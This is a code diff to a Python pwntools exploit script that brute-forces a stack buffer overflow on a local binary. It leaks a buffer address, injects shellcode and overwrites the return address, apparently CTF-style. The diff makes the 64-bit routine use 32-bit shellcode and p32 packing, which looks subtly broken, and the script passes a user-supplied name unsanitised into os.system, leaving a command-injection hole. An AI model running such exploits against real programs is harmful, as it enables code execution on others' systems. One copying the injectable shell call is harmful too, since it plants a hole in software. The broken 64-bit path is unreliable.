@@ -11,7 +11,7 @@ def bit32_exploit(binary_name):
         context.log_level = 'debug'
         print("roop " , i )
         p = process('./'+binary_name)
-        p.recvuntil(': ')
+        p.recvuntil('buf : ')
         addr = int(p.recv(10),16)
 
         payload = shellcode_32bit
@@ -40,13 +40,13 @@ def bit64_exploit(binary_name):
         context.log_level = 'debug'
         print("roop " , i )
         p = process('./'+binary_name)
-        p.recvuntil(': ')
-        addr = int(p.recv(14),16)
+        p.recvuntil('buf : ')
+        addr = int(p.recv(10),16)
 
-        payload = shellcode_64bit
+        payload = shellcode_32bit
         payload += 'A'*i
-        payload += 'B'*8
-        payload += p64(addr)
+        payload += 'B'*4
+        payload += p32(addr)
         p.sendline(payload)
         sleep(0.1)
         
@@ -64,14 +64,9 @@ def bit64_exploit(binary_name):
 memory_protects = ['Canary found', 'NX enabled']
 bit = 0
 
-print('32 bit or 64 bit : ')
+binary_name = raw_input('binary name : ').rstrip('\n')
+binary_data = int(input('32 biyt or 64 bit : '))
 
-binary_data = int(input())
-
-print('binary name : ')
-binary_name = raw_input()
-
-binary_name = binary_name.rstrip('\n')
 
 print("[+] Checking Banary....")
 os.system('checksec ' + binary_name + ' 2> output.txt')
